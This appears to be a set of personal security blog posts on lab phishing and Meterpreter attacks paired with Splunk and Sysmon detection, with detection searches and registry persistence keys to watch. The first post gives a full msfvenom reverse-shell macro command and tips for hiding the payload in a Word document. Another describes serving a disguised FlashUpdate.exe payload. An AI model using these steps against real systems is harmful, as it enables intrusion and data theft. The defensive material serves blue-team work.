## Welcome to CyberZombi3.co.uk

Links - 
Covenant Install and Example Usage [Covenant Install & Usage](Covenant-Install-and-usage)

Phish Me.........
Apologies for the lack of posts, I've been a little busy lately with getting a room sorted for my recently announced little one, along with my GPEN and my OSCP and just life in general, things have been a little manic to say the least.

Anyway I wanted to post something along the lines of Phishing and how it may look in my Splunk app, Mitre Att&ck Monitoring. Then whilst I was working on it I realised I cant really show everything I would want as I don't have that setup within my lab, So I guess will demo how to create a malicious document, email it to a victim to run and then talk a little about what to look out for.

The below is just a high level view of the above mentioned process with what tools I have available to me.

So I created a macro and payload using MsfVenom with the following command - msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=10.10.140.17 LPORT=4545 -e x86/shikata_ga_nai -f vba-exe


This then goes off and creates some vba code and a payload both need to be inserted into your malicious word document, it looks a little like below.


These then need to be added into the Word doc as you can see below. Just go ahead and copy and paste the code into the blank vba screen.
Create a nice looking document that suits the needs of your victim. Notice below the grey shaded area, that's the payload code that for this demo I have shrunk down the text size and changed the colour to white just so its not immediately seen, this could be hidden in an image or the footer that's really up to you how you want to go about hiding it.
So now were ready to send the email. It appears in the victims inbox as expected.
The user then opens the file and the payload runs. The user maybe prompted to enable editing. I found that that wasn't always the case when playing around with this. From then on in we can see in Splunk the word doc and what looks to be a strange looking executable ran at the time of execution.


This can then be confirmed from your newly gained Meterpreter session. Below we see the creation and the connection made.


As the attacker you can then go off and do what it is you need to do, escalate privileges, steal data etc etc.

So I also wanted to talk about what you can lookout for in your monitoring tools, things like -

obscure file names
office applications spawning processors
office applications attempting to connect to unknown URL's
discovery commands being ran by strange user accounts, maybe at strange times of the day, for example whoami ipconfig net accounts.
.HTA files within emails
If there are links in the email, hover over them to check the URL
if possible configure IDS / IPS & APT
Educate users via phishing simulations

The Splunk app I'm working on looks for all types of things based off the Mitre Att&ck framework but 1 or 2 events alone doesn't automatically mean malicious activity is occurring, with my app I want to get your attention by highlighting a whole bunch of events, then you will need to manually go off and build that bigger picture of an incident if there is one of course.

Below there are a few screenshots, I've mentioned it in some of my previous posts so you may have seen it before. I could probably release it as is now although its far from complete and currently does not cover the entire MA framework, let me know what you think.


For anyone wanting to have a play around with Phishing I came across the Morning Catch VM a while back and although it's a little dated now it still does the job.

Find out more about it here - https://blog.cobaltstrike.com/2014/08/06/introducing-morning-catch-a-phishing-paradise/

Obviously the information above should not be used to be internationally malicious and if that is your choice I cannot be held responsible for any of your actions, this post is for educational purpose only.

Find me on Twitter @CyberZombi3

Cheers

#Hacking #Hacker #RedTeam #Blueteam #ITSecurity #Noob #Splunk #Monitoring #MitreAttack #Phishing




Mitre Att&ck Splunk Dashboard Conversion to Splunk App
So just a short post really, as you know I have been working on a Mitre Att&ck Splunk dashboard but due to my GPEN course and OSCP among many other distractions so far this year progress has been slow.

However over the last few days I have managed to build out my own Splunk app which is named Mitre Att&ck Monitoring (see below). The reason behind this was that I had a dashboard full of items that ran every however often and it was just slow and kept crashing out, I figured it would be better to break the items up into the sections from the Mitre Att&ck Framework and go from there.

I might end up uploading it to SplunkBase when its closer to being finished but for now I'm happy to keep plodding on with it.


anyway as always if you have any questions yell at me on Twitter @CyberZombi3 Thanks CyberZombi3 #Hacking #Hacker #RedTeam #Blueteam #ITSecurity #Noob #Splunk #Monitoring #MitreAttack #BlueTeam


Mitre Att&ck Splunk Dashboard
So I was asked if I could post something about the Splunk Dashboard I have been working on based off of the Mitre Att&ck framework... I have to say it's still very much a work in progress but the basics are starting to take shape now.

A few pre reqs -

Sysmon logging enabled
Powershell logging enabled
Netmon logging enable (not really discussed below but I may cover it some other time)
A Splunk install
A basic knowledge of Splunk .conf files will help

Right so that's what it kinda looks like at the moment ^^^ obviously there's work to be done yet and it probably wont look like this when its finished. I'm pretty lucky with my job at the moment as the Blue Team guy, I need to figure out detection methods for the Red Team guys and also real world attacks.

This ties in nicely for me as I also want to be a Red Team guy / Pen Tester super cool dude, well I'm cool already.. that's what I tell myself anyway, so listen, in order for me to find detection methods it means I get to learn the attack methods which is pretty epic, for me to be able to get on with this at work as well as a hobby at home.

I will of course have to continue to build out the dashboard and find new ways to monitor for attacks and suspicious behavior and any new methods that come to light, this will then somehow be implemented into the work environment with all the other stuff we do sitting alongside.

I guess its worth mentioning that there's more than one way to perform the same attack and not all the methods I use to detect what I believe could be harmful will be detected, I guess this will always be an organic growing process.

So onto the dashboard, I'm not going to go into massive detail, it is a pretty straight forward process, the hard work is testing and finding results and creating the correct searches that display the data you can and want to work with.

So It's made within Splunk you can get a free copy if you don't go over the 500 meg daily limit, if you already have this at work then grab yourself a dev license from Splunk for free, that will give you 50 gig per day for testing.

So there are a bunch of items I have been detecting so far, some of the items alone may not arouse suspicion.

However if a number maybe 5 or 6 plus panels starting pinging up alerts and they were during odd hours of the day or there were unknown systems / users being seen / obfuscated data and so on then its time to get to digging right.

If Security Logs are deleted
If known persistence Reg Keys are modified
If basic cmds are performed during odd times i.e. whoami / tasklist / tree / systeminfo / query user among lots of others.

so here are a couple of the C2C panels.

Right if we wanted to create something like above, we fire up Splunk, Navigate over to the main search windows, select dashboards, then create new and then you would have a blank template, from there you go add panel in the top left corner, followed by the panel type on the right hand side.

You then need select what type, for the above look and feel you want to go ahead and select Single Value (the search would also be slightly different for these as you would want to add a count to assist the graphic)

sourcetype="wineventlog:windows powershell" OR EventCode=403 OR EventCode=400 OR EventCode=600 earliest=-1440m latest=now index=main | stats count as Total

You can then go right ahead and pop in your search terms, for this I one I want to see if certain powershell event codes are being created (see above) *** it's note worthy too that I have blacklisted and white listed a whole bunch of event codes in the lab so it's less license intensive, makes it easier to find things too. If you have a whole bunch of automagic panels be sure to offset the refresh rates as your dashboard and system will just become unresponsive.

You can then confirm your visualization and also your formatting, I don't want to go into too much detail here, you can see that the options are pretty straight forward.
And that's all there is to it really, the events in a normal view would look like the below and take up a lot of space so unless you see something of interest you don't really want to be going through potentially 100's of logs.


I will pop a few searches just below that you could use to aid in your quest for finding badness, again these things need to be looked at from a bigger picture someone running a getmac or systeminfo or ip config alone is most likely nothing to worry about.

So a few searches you could use -

("route" AND "print") OR ("arp" AND "-a") OR "getmac" OR ("net" AND "config") earliest=-1440m latest=now index=main | stats count as Total

EventCode=4625 | stats count by Account_Name, Workstation_Name, Failure_Reason, Source_Network_Address | rename Account_Name as "UserName" | rename Workstation_Name as "System" | rename count as "No of Failed Logins" | rename Failure_Reason as "Failure Reason" | rename Source_Network_Address as "Source IP"

-nop -w hidden" earliest=-1440m latest=now index=main

Or maybe

-nop AND -w AND hidden AND .downloadstring

These searches really should come from your own testing and be built off the results you find yourself, you may wish to look for different IOC but for me I want to be alerted on multiple items and then I can put them altogether if needed.

If you were to see a .hta file drop followed by the Administrator account with a system name of o6BfwsGHO2x3jtKz with maybe a few unknown user name or bad password errors along with a strange IP at a strange time of day, performing "getmac", "systeminfo", "netaccounts", "netsh advfirewall show all" among whatever else, this has to be raising suspicion right......

anyway as always hope this helps someone out there a little if you have any questions yell at me on Twitter @CyberZombi3
Thanks

CyberZombi3

#Hacking #Hacker #RedTeam #Blueteam #ITSecurity #Noob #Splunk #Monitoring #MitreAttack #BlueTeam #Discovery #Dashboards



Attack - Discover & Blue Team...
Hey guys so I've been looking at the Mitre Att&ck Framework a lot recently, figured i'd put a post up about it.

Mitre Att&ck Table - A small selection from the Discovery phase


So I wanted to write a short post about a selection of the Discovery items from within the Mitre Att&ck Table. I thought it would also be kinda cool to show the attack phase too, so below you will see an example from a simple attack followed by some basic commands to discover who I am and where I am followed by what the results could look like from a Blue Team perspective when investigating off the back of any alerts.

Meterpreter Attack - Discovery - & Blue Team
In the example below I have a very simple lab setup that consists of a Domain Controller and a Workstation (although that's not used in this example) and of course my attacking box which is in the form of Parrot OS. I use Parrot over Kali as it doesn't seem to break as often, at least for me anyway.

So lets jump right in, below you can see I create a payload with msfvenom and name it FlashUpdate.exe, I then confirm that the file has been created in the directory, and finally I fire up a Simple Http Server to serve up the payload.


I then move over to the victim system in this case its my Domain Controller (DC01), from there I navigate to the Simple Http server address I've just setup and run the payload, as you can see it's listed below as FlashUpdate.exe. In the real world obviously this payload could be delivered via many different methods.


I also need to exploit the system as per below
At this point the victim runs the payload
Boom we have our session, as you can see with the Meterpreter prompt ready to go.
So that is the Attack, we have a remote connection and we can start snooping around the victims system for information. From a Blue Team perspective at least for me at the moment I'm unable to monitor whats ran from the Meterpreter prompt however if and when you move into the command prompt, that's when we can see whats happening. ***I'm looking into monitoring what commands are ran from the Meterpreter prompt***

So the attacker has his/her connection, they perhaps don't know what they are connected to so will want to run commands like pwd / getuid and so on.
for this example we then jump over to a command prompt with - execute -f cmd.exe -i -H

Right we now have a command prompt and that can be monitored, for the monitoring process I use Splunk and Sysmon, so all the logs sit in the windows event viewer and splunk indexes them.

You would need to have Splunk configured to pull these logs in, something similar to this should do the trick -

wineventlog://Microsoft-Windows-Sysmon/Operational
disabled = 0
index = main
renderxml = false
start_from = oldest

(This sits in the Inputs.conf file, don't forget any changes need to be saved and the service restarted)

So lets run a few commands and see what we can get.

Systeminfo
Whoami
Tree

The list goes on and on so lets look at how this translates in Splunk. Below you can see highlighted Commandline: this is one of the Splunk search terms that you would look for along with tree / whoami or any other items you are interested in. Tree has been ran and below that in the next image also whoami has also been ran, now this alone may not ring alarm bells but that's where you need to apply a little common sense and alert accordingly and even correlate multiple events from various systems to investigate potential issues further.

For example the Administrator account running a Whoami at 3:24 am should sound alarm bells, you would think a 3rd line engineer logged into one of his own systems would know who he was logged in as (unless hes maybe had a few too many beers before he got called out) :)

In the image at the top of the page there are 4 examples pulled from the Discovery phase of the Mitre Att&ck Table and also the Splunk searches needed to monitor the Discovery items listed. its a start for you guys if nothing else.


I think that about covers off everything, I hope this is of some use to someone out there. Thanks for reading and have a great day :)

Thanks

CyberZombi3

#Hacking #Hacker #RedTeam #Blueteam #ITSecurity #Noob #Splunk #Monitoring #Discovery #Meterpreter #MitreAttack #BlueTeamManual


Basic Blue Team Registry monitoring with Splunk...
Updated: Aug 14, 2018
Hey guys so I've been looking at Registry monitoring and come up with a list of Registry hives / keys.



I wanted to write a short post about logging some of the more well known Registry keys used by attackers with Splunk. The keys listed towards the bottom of this post are used by Red Teams and real world attackers to maintain persistence and hide startup scripts etc. Splunk is a monitoring tool that's widely accepted as the best logging tool around however it comes at a cost. Splunk can be found here Splunk There are different packages available, Enterprise being the choice of large company's but they do also have a free version, providing logging per day does not exceed 500 meg if I remember correctly.
“they do also have a free version providing logging per day does not exceed 500 meg.”
For a basic lab setup all you only need a low spec system and a standard Splunk installation, very much a next next finish procedure, within a corporate environment there would be systems dedicated to tasks such as an Indexer, License Manager, Search Head, Cluster Master and Universal Forwarders among others.

So below I wanted to provide a few examples of config that you would add into the inputs.conf file found within the Splunk installation directory I.E. C:\Program Files\Splunk\Etc\System\Local This can also be completed via the Splunk GUI however I like to work in the configuration files personally.

Below are examples of registry key stanza's that you would create for all the listed Registry keys there may be some adjustments needed. These can be modified further however in the examples below, the stanza we start with states the desired source type name = Registry, Splunk also monitors for all processes that could potentially make a change to the Registry, an example of this would be regedit.exe however were going to monitor all processes hence the proc = .* You also have the hive of the Registry (location), and the type of changes you wish to monitor I.E. creation / deletion renaming or setting.
You can also have Splunk complete a baseline of the Registry, (this can degrade the performance on a system if completed regularly) if you state = 1 this will complete a baseline once per day (this is default) and finally you add the Index you wish to log the events too, default on most systems would be "Main" however I would suggest having a separate index for these logs.

Further info can be found here - SplunkRegMonitoring

[WinRegMon://Registry] proc = .* hive = \\REGISTRY\\USER\\.*\\SOFTWARE\\MICROSOFT\\WINDOWS\\CURRENTVERSION\\RUN\\.* type = create|delete|set|rename baseline = 1 index = main

[WinRegMon://Registry] proc = .* hive = \\REGISTRY\\MACHINE\\SOFTWARE\\MICROSOFT\\WINDOWS\\CURRENTVERSION\\RUN\\.* type = create|delete|set|rename baseline = 1 index = main

Below you can see the results of the monitoring put in place above, the Splunk console shows that there has been a change made to the listed Registry items, this could include scripts to auto run a becon from Cobalt Strike or any number of other methods, they perhaps wouldn't be as obvious as the below items though, "yougothacked" kinda screams out at you :)

Off the back of any results found you can of course configure alerting via email among others, you can also create a Dashboard containing various bits of information, an example can been seen here just below and also at the top of this post.

The List

As promised please see below for a list of Registry hives / keys that you could use as a starting point, there are more... you may think there should be less or maybe even more. That's always going to come down to a matter of opinion. I hope this helps in some way if your not familiar with Splunk or if you are just looking for a starting place for Registry monitoring.

HKCU\Environment

HKCU\Control Panel\Desktop\Scrnsave.exe

HKCU\Software\Microsoft\Command Processor\Autorun

HKCU\Software\Microsoft\Internet Explorer\Desktop\Components

HKCU\Software\Microsoft\Internet Explorer\Explorer Bars
HKCU\Software\Microsoft\Internet Explorer\Extensions
HKCU\Software\Microsoft\Internet Explorer\UrlSearchHooks\Server\Install\Software\Microsoft\Windows\CurrentVersion\Run
HKCU\Software\Microsoft\Windows NT\CurrentVersion\Windows\Run
HKCU\Software\Microsoft\Windows\CurrentVersion\Winlogon
HKCU\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell
HKCU\Software\Microsoft\Windows NT\CurrentVersion\Run
HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices
HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce
HKCU\Software\Policies\Microsoft\Windows\Control Panel\Desktop\Scrnsave.exe
HKCU\Software\Policies\Microsoft\Windows\System\Scripts\Logoff
HKCU\Software\Wow6432Node\Microsoft\Internet Explorer\Explorer Bars
HKCU\Software\Wow6432Node\Microsoft\Internet Explorer\Extensions
HKCU\Software\Microsoft\Windows\CurrentVersion\Winlogon
HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify
HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell
HKLM\Software\Microsoft\Windows\CurrentVersion\Winlogon
HKLM\Software\Microsoft NT\CurrentVersion\Winlogon\System
HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Taskman
HKLM\Software\Microsoft\Windows\CurrentVersion\GroupPolicy\Scripts\Shutdown
HKLM\Software\Microsoft\Windows\CurrentVersion\GroupPolicy\Scripts\Startup
HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run
HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Shell
HKLM\Software\Microsoft\Windows\CurrentVersion\Run
HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce
HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices
HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce
HKLM\Software\Policies\Microsoft\Windows\System\Scripts\Logoff
HKLM\Software\Policies\Microsoft\Windows\System\Scripts\Logon
HKLM\Software\Policies\Microsoft\Windows\System\Scripts\Shutdown
HKLM\Software\Policies\Microsoft\Windows\System\Scripts\Startup
HKLM\Software\Wow6432Node\Microsoft\Command\Processor\Autorun
HKLM\Software\Wow6432Node\Microsoft\Internet Explorer\Explorer Bars
HKLM\Software\Wow6432Node\Microsoft\Internet Explorer\Extensions
HKLM\Software\Wow6432Node\Microsoft\Internet Explorer\Toolbar
HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run
HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce
HKLM\System\CurrentControlSet\Control\LSA

Other -

HKCU\Software\Classes\Mscfile\Shell\Open\Command
HKCU\Software\Microsoft\Windows\CurrentVersion\App Paths\Control.exe
HKCU\Software\Classes\Exefile\Shell\Runas\Command\IsolatedCommand
HKLM\Software\Microsoft\Windows Nt\CurrentVersion\Imagefileexecutionoptions
HKLM\System\CurrentControlSet\Enum\USBTor
HKLM\System\CurrentControlSet\Enum\USB

The majority of the above have come from -

The Blue Team Handbook
The Mitre Att&ck Table
Working alongside a Red Team

Thanks

CyberZombi3

#Hacking #Hacker #RedTeam #Blueteam #ITSecurity #Noob #Splunk #Monitoring #Registry #Persistence #MitreAttack #BlueTeamManual
